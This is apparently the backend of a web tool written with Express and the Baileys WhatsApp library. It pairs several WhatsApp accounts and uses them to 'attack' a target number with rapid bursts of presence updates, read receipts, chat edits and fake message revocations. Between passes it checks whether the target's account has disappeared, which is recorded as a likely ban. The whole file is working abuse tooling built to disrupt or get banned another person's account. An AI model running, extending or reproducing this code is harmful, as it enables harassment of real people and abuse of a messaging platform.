'use strict'
const express = require('express')
const path = require('path')
const crypto = require('crypto')
const { DisconnectReason } = require('@whiskeysockets/baileys')
const { redis, openSocket } = require('./wa')

const app = express()
app.use(express.json({ limit: '32kb' }))

const delay = (ms) => new Promise((r) => setTimeout(r, ms))
const uid = () => crypto.randomBytes(6).toString('hex')
const BUDGET = Number(process.env.ATTACK_BUDGET_MS || 52000)
const MAX_SESSIONS = Number(process.env.MAX_SESSIONS || 3)

const RATE = 70, BURST = 140
const MODULES = ['presence', 'receipt', 'chatmodify', 'revoke', 'globalPresence']

const toJid = (raw) => {
  const d = String(raw).replace(/\D/g, '')
  if (d.length < 8) throw new Error('numéro invalide')
  return `${d}@s.whatsapp.net`
}

/* ---------------- modules ---------------- */
const newId = () => crypto.randomBytes(10).toString('hex').toUpperCase()
const MODS = {
  async presence(s, jid, n) {
    if (n % 12 === 0) await s.presenceSubscribe(jid)
    await s.sendPresenceUpdate('composing', jid)
    await s.sendPresenceUpdate('paused', jid)
  },
  async receipt(s, jid) { await s.sendReceipt(jid, undefined, [newId()], 'read') },
  async chatmodify(s, jid) {
    const key = { remoteJid: jid, fromMe: true, id: newId() }
    await s.chatModify({ markRead: true, lastMessages: [{ key, messageTimestamp: Math.floor(Date.now() / 1000) }] }, jid)
  },
  async revoke(s, jid) { await s.sendMessage(jid, { delete: { remoteJid: jid, fromMe: true, id: newId() } }) },
  async globalPresence(s, _j, n) {
    if (n % 8 !== 0) return
    await s.sendPresenceUpdate('available')
    await s.sendPresenceUpdate('unavailable')
  }
}

/* ---------------- état ---------------- */
async function listSessions() {
  const h = (await redis.hgetall('wa:sessions')) || {}
  return Object.entries(h).map(([label, v]) => ({ label, ...(JSON.parse(v) || {}) }))
}
async function setSession(label, patch) {
  const cur = JSON.parse((await redis.hget('wa:sessions', label)) || '{}')
  await redis.hset('wa:sessions', { [label]: JSON.stringify({ ...cur, ...patch, at: Date.now() }) })
}
const getJob = async () => JSON.parse((await redis.get('wa:job')) || 'null')
const setJob = async (j) => redis.set('wa:job', JSON.stringify(j), { ex: 900 })

/* ---------------- routes ---------------- */
app.get('/api/state', async (_q, res) => {
  res.json({ sessions: await listSessions(), job: await getJob(), maxSessions: MAX_SESSIONS, budget: BUDGET })
})

app.delete('/api/session/:label', async (q, res) => {
  await redis.hdel('wa:sessions', q.params.label)
  res.json({ ok: true })
})

/* appairage : on garde la fonction vivante jusqu'à l'ouverture ou 48 s */
app.post('/api/pair', async (q, res) => {
  const { label, phone } = q.body || {}
  if (!label || !phone) return res.status(400).json({ error: 'label et numéro requis' })
  if (!/^[a-z0-9_-]{2,24}$/i.test(label)) return res.status(400).json({ error: 'label invalide' })

  await setSession(label, { phone: String(phone).replace(/\D/g, ''), status: 'pairing', code: null })
  const { sock, registered } = await openSocket(label, String(phone).replace(/\D/g, ''))
  let code = null, opened = false, asked = false

  sock.ev.on('connection.update', async (u) => {
    if (u.qr && !registered && !asked) {
      asked = true
      await delay(1200)
      try {
        const raw = await sock.requestPairingCode(String(phone).replace(/\D/g, ''))
        code = String(raw).match(/.{1,4}/g)?.join('-') ?? raw
        await setSession(label, { status: 'awaiting', code })
      } catch (e) { await setSession(label, { status: 'pair-error', code: e.message }) }
    }
    if (u.connection === 'open') {
      opened = true
      await setSession(label, { status: 'online', code: null })
    }
    if (u.connection === 'close') {
      const c = u.lastDisconnect?.error?.output?.statusCode
      if (c === DisconnectReason.loggedOut) await setSession(label, { status: 'logged-out' })
    }
  })

  const end = Date.now() + 48000
  while (!opened && Date.now() < end) await delay(500)
  try { sock.end(undefined) } catch {}
  res.json({ ok: true, code, opened })
})

/* attaque : une seule invocation, budget borné */
app.post('/api/attack', async (q, res) => {
  const b = q.body || {}
  if ((await getJob())?.status === 'running') return res.status(409).json({ error: 'attaque déjà en cours' })

  let jid
  try { jid = toJid(b.target) } catch (e) { return res.status(400).json({ error: e.message }) }

  const online = (await listSessions()).filter((s) => s.status === 'online').map((s) => s.label)
  const pool = (Array.isArray(b.sessions) && b.sessions.length
    ? b.sessions.filter((l) => online.includes(l)) : online).slice(0, MAX_SESSIONS)
  if (!pool.length) return res.status(400).json({ error: 'aucune session en ligne' })

  const passes = Math.min(3, Math.max(1, Number(b.passes) || 1))
  const mods = (Array.isArray(b.modules) && b.modules.length ? b.modules : MODULES.slice(0, 4))
    .filter((m) => MODS[m])

  // budget : on répartit, pauses supprimées
  const perPass = Math.max(12000, Math.floor((BUDGET - 12000) / passes))
  const job = {
    id: uid(), target: jid, display: String(b.target).replace(/\D/g, ''),
    status: 'running', signal: false, final: null, reason: null,
    rows: Array.from({ length: passes }, (_, i) => ({
      pass: i + 1, sessions: Math.min(pool.length, i + 1), durationSec: Math.round(perPass / 1000),
      ops: 0, status: 'pending', verdict: null
    }))
  }
  await setJob(job)
  runJob(job, pool, mods, perPass).catch(async (e) => {
    job.status = 'error'; job.reason = e.message; await setJob(job)
  })
  res.json({ id: job.id })
})

app.post('/api/stop', async (_q, res) => {
  const j = await getJob()
  if (j) { j.signal = true; await setJob(j) }
  res.json({ ok: true })
})

/* ---------------- exécution ---------------- */
async function runJob(job, pool, mods, perPass) {
  const socks = {}
  try {
    for (const label of pool) {
      const { sock } = await openSocket(label)
      socks[label] = sock
      await delay(600)
    }

    const probe = socks[pool[0]]
    const chk = await probe.onWhatsApp(job.target).catch(() => null)
    if (chk && (!chk.length || !chk[0]?.exists)) {
      job.status = 'done'; job.final = 'absent'; job.reason = 'numéro absent'
      job.rows[0].status = 'absent'; return
    }

    const share = Math.max(8, Math.floor(RATE / pool.length))
    let tok = BURST, last = Date.now(), ops = 0
    const take = () => {
      const now = Date.now()
      tok = Math.min(BURST, tok + ((now - last) / 1000) * share); last = now
      if (tok >= 1) { tok -= 1; return true }
      return false
    }

    for (let p = 0; p < job.rows.length; p++) {
      if (job.signal) break
      const row = job.rows[p]
      row.status = 'running'
      await setJob(job)
      const until = Date.now() + perPass
      let i = 0
      while (Date.now() < until && !job.signal) {
        if (!take()) { await delay(4); continue }
        const mod = MODS[mods[i % mods.length]]
        const s = socks[pool[i % pool.length]]
        ops++; i++
        mod(s, job.target, i).catch(() => {})
        if (i % 50 === 0) { row.ops = ops; await setJob(job) }
        await delay(2)
      }
      row.ops = ops
      row.status = job.signal ? 'stopped' : 'done'
      await setJob(job)

      const clean = pool[pool.length - 1]
      await delay(3500)
      let exists = null
      try {
        const r = await socks[clean].onWhatsApp(job.target)
        exists = !!(r && r.length && r[0]?.exists)
      } catch {}
      row.verdict = exists === false ? 'banni-probable' : exists === true ? 'toujours-actif' : 'inconnu'
      await setJob(job)
      if (exists === false) {
        job.status = 'done'; job.final = 'fucked'; return
      }
    }
    job.status = 'done'; job.final = 'active'
  } catch (e) {
    job.status = 'error'; job.reason = e.message
  } finally {
    for (const s of Object.values(socks)) { try { s.end(undefined) } catch {} }
    await setJob(job)
  }
}

module.exports = app
